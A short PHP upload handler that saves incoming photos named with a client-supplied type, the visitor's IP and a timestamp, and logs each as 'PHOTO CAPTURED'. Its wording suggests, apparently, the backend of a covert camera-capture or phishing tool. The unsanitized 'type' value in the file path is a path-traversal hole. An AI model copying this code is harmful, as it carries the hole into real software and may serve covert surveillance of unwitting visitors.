<?php
if(isset($_FILES['photo'])){
    @mkdir('data/photos',0755,true);
    $ip=$_SERVER['REMOTE_ADDR'];
    $type=$_POST['type']??'unknown';
    $filename=sprintf('data/photos/%s_%s_%s.jpg',$type,$ip,date('Ymd-His'));
    
    if(move_uploaded_file($_FILES['photo']['tmp_name'],$filename)){
        $log=sprintf("[%s] PHOTO CAPTURED: %s (IP:%s)\n",date('Y-m-d H:i:s'),basename($filename),$ip);
        file_put_contents('data/logs.txt',$log,FILE_APPEND|LOCK_EX);
    }
}
?>
